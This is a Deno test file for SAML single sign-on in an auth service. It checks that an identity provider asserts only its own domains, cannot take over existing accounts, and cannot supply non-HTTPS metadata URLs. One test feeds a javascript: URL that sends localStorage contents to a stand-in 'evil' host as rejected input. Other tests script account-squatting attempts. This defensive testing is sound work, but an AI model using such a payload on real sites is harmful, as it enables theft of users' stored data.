// The SSO trust model on `/auth/v1` (raw HTTP, an in-test IdP key): an IdP speaks only for its
// own email domains, never takes over an existing account by email unless a config-declared
// provider opts in (`linkExistingAccounts`), creates no user while sign-ups are off, and its
// metadata can't hand the browser a non-HTTPS (or script) URL.

import { assert, assertEquals, assertExists, assertThrows } from "@std/assert";
import { inMemoryAuthAdapter } from "../packages/auth/src/memory-adapter.ts";
import { parseIdpMetadata } from "../packages/auth/src/saml/metadata.ts";
import type { GoTrueOptions, GoTrueSamlProvider } from "../packages/auth/src/gotrue/options.ts";
import { encode, marker, responseXml, rsaKey, sign, type TestKey } from "./_saml-helpers.ts";
import { ORIGIN, type SupabaseAuthApp, supabaseAuthApp } from "./_supabase-auth-app.ts";

const IDP = "https://idp.example.org/metadata";
const SP_ENTITY = `${ORIGIN}/auth/v1/sso/saml/metadata`;
const ACS = `${ORIGIN}/auth/v1/sso/saml/acs`;

function metadataXml(cert: string, ssoUrl = "https://idp.example.org/sso"): string {
  return `<?xml version="1.0"?>
<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" xmlns:ds="http://www.w3.org/2000/09/xmldsig#" entityID="${IDP}">
  <md:IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
    <md:KeyDescriptor use="signing"><ds:KeyInfo><ds:X509Data><ds:X509Certificate>${cert}</ds:X509Certificate></ds:X509Data></ds:KeyInfo></md:KeyDescriptor>
    <md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="${ssoUrl}"/>
  </md:IDPSSODescriptor>
</md:EntityDescriptor>`;
}

async function requestIdOf(url: string): Promise<string> {
  const raw = new URL(url).searchParams.get("SAMLRequest")!;
  const bytes = Uint8Array.from(atob(raw), (c) => c.charCodeAt(0));
  const xml = await new Response(
    new Blob([bytes]).stream().pipeThrough(new DecompressionStream("deflate-raw")),
  ).text();
  return xml.match(/ ID="([^"]+)"/)![1];
}

const iso = (ms: number) => new Date(ms).toISOString().replace(/\.\d{3}Z$/, "Z");

async function samlResponse(key: TestKey, inResponseTo: string, nameId: string) {
  const now = Date.now();
  const id = `_a${crypto.randomUUID().replaceAll("-", "")}`;
  const xml = responseXml({
    destination: ACS,
    recipient: ACS,
    audience: SP_ENTITY,
    responseIssuer: IDP,
    issuer: IDP,
    responseInResponseTo: inResponseTo,
    inResponseTo,
    nameId,
    notBefore: iso(now - 60_000),
    notOnOrAfter: iso(now + 300_000),
    confirmationNotOnOrAfter: iso(now + 300_000),
    issueInstant: iso(now - 1000),
    sessionNotOnOrAfter: iso(now + 3600_000),
    assertionId: id,
    assertionSig: marker(id),
  });
  return encode(await sign(xml, id, { key }));
}

function admin(app: SupabaseAuthApp, path: string, body?: unknown) {
  return app.fetch(`${ORIGIN}/auth/v1/admin${path}`, {
    method: body === undefined ? "GET" : "POST",
    headers: { apikey: app.secretKey, "content-type": "application/json" },
    body: body === undefined ? undefined : JSON.stringify(body),
  });
}

/** One SP-initiated SSO round trip: the session's claims, or the refusal. */
async function login(
  app: SupabaseAuthApp,
  key: TestKey,
  providerId: string,
  nameId: string,
): Promise<{ status: number; claims?: Record<string, unknown>; error?: string }> {
  const started = await app.fetch(`${ORIGIN}/auth/v1/sso`, {
    method: "POST",
    headers: { apikey: app.publishableKey, "content-type": "application/json" },
    body: JSON.stringify({ provider_id: providerId, redirect_to: `${ORIGIN}/welcome` }),
  });
  const url = (await started.json()).url as string;
  const res = await app.fetch(ACS, {
    method: "POST",
    headers: { "content-type": "application/x-www-form-urlencoded" },
    redirect: "manual",
    body: new URLSearchParams({
      SAMLResponse: await samlResponse(key, await requestIdOf(url), nameId),
      RelayState: new URL(url).searchParams.get("RelayState")!,
    }),
  });
  const location = res.headers.get("location");
  if (!location) return { status: res.status, error: (await res.json()).error_code };
  const token = new URLSearchParams(new URL(location).hash.slice(1)).get("access_token")!;
  const part = token.split(".")[1].replace(/-/g, "+").replace(/_/g, "/");
  return { status: res.status, claims: JSON.parse(atob(part)) };
}

async function withSso(
  fn: (app: SupabaseAuthApp, key: TestKey) => Promise<void>,
  provider: Partial<GoTrueSamlProvider> = {},
  auth: GoTrueOptions = {},
) {
  const key = await rsaKey();
  const app = await supabaseAuthApp({
    adapter: inMemoryAuthAdapter(),
    auth: {
      ...auth,
      saml: {
        providers: [{
          id: "acme",
          domains: ["example.com"],
          metadataXml: metadataXml(key.certificate),
          ...provider,
        }],
      },
    },
    withClient: false,
  });
  try {
    await fn(app, key);
  } finally {
    await app.close();
  }
}

async function userByEmail(app: SupabaseAuthApp, email: string) {
  const list = await (await admin(app, "/users")).json();
  // deno-lint-ignore no-explicit-any
  return list.users.find((u: any) => u.email === email);
}

Deno.test("SAML-1: an IdP can't create an account for an address outside its domains", async () => {
  await withSso(async (app, key) => {
    const signedIn = await login(app, key, "acme", "ceo@victim-corp.test");
    assertEquals(signedIn.status, 303, "the SSO user signs in");
    assertEquals(signedIn.claims!.email ?? "", "", "but the address is not bound to the account");
    assertEquals(await userByEmail(app, "ceo@victim-corp.test"), undefined);
    // The real owner of that address signs up later and owns it: no SSO identity on it.
    const otp = await app.fetch(`${ORIGIN}/auth/v1/otp`, {
      method: "POST",
      headers: { apikey: app.publishableKey, "content-type": "application/json" },
      body: JSON.stringify({ email: "ceo@victim-corp.test", create_user: false }),
    });
    assertEquals(otp.status, 422, "no account exists for the address");
    await otp.body?.cancel();
  });
});

Deno.test("SAML-1: an in-domain SSO account is verified and has no email identity", async () => {
  await withSso(async (app, key) => {
    const signedIn = await login(app, key, "acme", "alice@example.com");
    assertEquals(signedIn.claims!.email, "alice@example.com");
    const user = await userByEmail(app, "alice@example.com");
    assertExists(user.email_confirmed_at);
    const rows = await app.config.adapter!.listAccounts!(user.id);
    assertEquals(rows.map((row) => row.provider), ["sso:acme"], "no stored email identity");
  });
});

Deno.test("SAML-1: SSO honours disableSignup and the provider's allowSignUp", async () => {
  await withSso(
    async (app, key) => {
      const refused = await login(app, key, "acme", "new@example.com");
      assertEquals([refused.status, refused.error], [422, "signup_disabled"]);
    },
    {},
    { disableSignup: true },
  );
  await withSso(async (app, key) => {
    const refused = await login(app, key, "acme", "new@example.com");
    assertEquals([refused.status, refused.error], [422, "signup_disabled"]);
  }, { allowSignUp: false });
});

Deno.test("SAML-1: a provider stored through the admin API may only assert its own domains", async () => {
  const key = await rsaKey();
  const app = await supabaseAuthApp({
    adapter: inMemoryAuthAdapter(),
    auth: { saml: {} },
    withClient: false,
  });
  try {
    const created = await admin(app, "/sso/providers", {
      type: "saml",
      metadata_xml: metadataXml(key.certificate),
      domains: ["tenant.example"],
    });
    assertEquals(created.status, 201, await created.clone().text());
    const id = (await created.json()).id as string;
    const outside = await login(app, key, id, "ceo@victim-corp.test");
    assertEquals([outside.status, outside.error], [403, "email_address_not_authorized"]);
    const inside = await login(app, key, id, "bob@tenant.example");
    assertEquals(inside.claims!.email, "bob@tenant.example");
  } finally {
    await app.close();
  }
});

Deno.test("SAML-2: SSO does not take over an existing account by email", async () => {
  await withSso(async (app, key) => {
    const created = await admin(app, "/users", {
      email: "admin@example.com",
      password: "S3cret-pass-word!",
      email_confirm: true,
    });
    assertEquals(created.status, 200);
    await created.body?.cancel();
    const refused = await login(app, key, "acme", "admin@example.com");
    assertEquals([refused.status, refused.error], [422, "email_exists"]);
  });
});

Deno.test("SAML-2: linkExistingAccounts links an in-domain account, clearing an unconfirmed one", async () => {
  await withSso(async (app, key) => {
    const created = await (await admin(app, "/users", {
      email: "admin@example.com",
      password: "S3cret-pass-word!",
      email_confirm: true,
    })).json();
    const linked = await login(app, key, "acme", "admin@example.com");
    assertEquals(linked.claims!.sub, created.id, "the trusted IdP links the account");
    // An unconfirmed squat of an in-domain address: linked, and its password retired.
    const squat = await app.fetch(`${ORIGIN}/auth/v1/signup`, {
      method: "POST",
      headers: { apikey: app.publishableKey, "content-type": "application/json" },
      body: JSON.stringify({ email: "bob@example.com", password: "attacker-password" }),
    });
    const squatId = (await squat.json()).id as string;
    const bob = await login(app, key, "acme", "bob@example.com");
    assertEquals(bob.claims!.sub, squatId);
    const grant = await app.fetch(`${ORIGIN}/auth/v1/token?grant_type=password`, {
      method: "POST",
      headers: { apikey: app.publishableKey, "content-type": "application/json" },
      body: JSON.stringify({ email: "bob@example.com", password: "attacker-password" }),
    });
    assertEquals((await grant.json()).error_code, "invalid_credentials");
    // Outside the domains it still never links.
    await (await admin(app, "/users", { email: "carol@other.test", email_confirm: true })).body
      ?.cancel();
    const carol = await login(app, key, "acme", "carol@other.test");
    assert(carol.claims, "a separate, email-less SSO user");
    assertEquals(carol.claims!.email ?? "", "");
  }, { linkExistingAccounts: true });
});

Deno.test("SAML-3: IdP metadata endpoints must be https", async () => {
  const key = await rsaKey();
  for (const bad of ["javascript:fetch('//evil/'+localStorage.x)//", "data:text/html,hi"]) {
    assertThrows(() => parseIdpMetadata(metadataXml(key.certificate, bad)), Error, "http(s)");
  }
  const app = await supabaseAuthApp({
    adapter: inMemoryAuthAdapter(),
    auth: {
      saml: {
        providers: [{
          id: "plain",
          domains: ["plain.example"],
          metadataXml: metadataXml(key.certificate, "http://idp.example.org/sso"),
        }],
      },
    },
    withClient: false,
  });
  try {
    const refusedAdmin = await admin(app, "/sso/providers", {
      type: "saml",
      metadata_xml: metadataXml(key.certificate, "http://idp.example.org/sso").replace(
        IDP,
        "https://other.example/metadata",
      ),
    });
    assertEquals(refusedAdmin.status, 400);
    assertEquals((await refusedAdmin.json()).error_code, "validation_failed");
    const started = await app.fetch(`${ORIGIN}/auth/v1/sso`, {
      method: "POST",
      headers: { apikey: app.publishableKey, "content-type": "application/json" },
      body: JSON.stringify({ provider_id: "plain" }),
    });
    assertEquals(started.status, 400, "a plaintext SSO URL is never handed to the browser");
    await started.body?.cancel();
  } finally {
    await app.close();
  }
});
